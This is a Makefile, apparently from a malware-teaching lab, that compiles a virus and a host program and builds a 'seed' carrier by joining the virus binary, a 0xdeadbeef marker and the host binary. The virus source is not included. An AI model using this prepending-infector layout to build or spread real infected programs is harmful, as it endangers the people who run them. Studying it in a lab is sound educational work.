all: virus host seed

virus: virus.c
	gcc -o virus  -g -Wall virus.c

host: host.c
	gcc -o host -g -Wall host.c

seed: virus.c host.c
	cp virus seed
	printf '\xde\xad\xbe\xef' >> seed
	cat host >> seed

clean:
	rm virus host seed
